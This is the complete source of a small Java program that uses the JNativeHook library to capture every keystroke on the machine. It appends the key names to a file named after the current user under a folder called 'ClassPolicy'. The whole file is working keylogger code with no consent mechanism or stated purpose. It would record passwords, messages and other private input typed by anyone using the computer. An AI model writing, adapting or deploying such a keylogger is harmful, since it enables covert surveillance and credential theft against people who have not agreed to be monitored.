package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener{
	public static void main (String[] args) throws IOException {
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists()) {
			System.out.println("Creating logfile...");
			log.createNewFile();
		} else {
			System.out.println("Starting...");
		}
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());
		
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
	    System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	System.out.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	System.out.print(" ");
		//} else {
		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
		}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	public static void record(String x) {
		try {
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
}
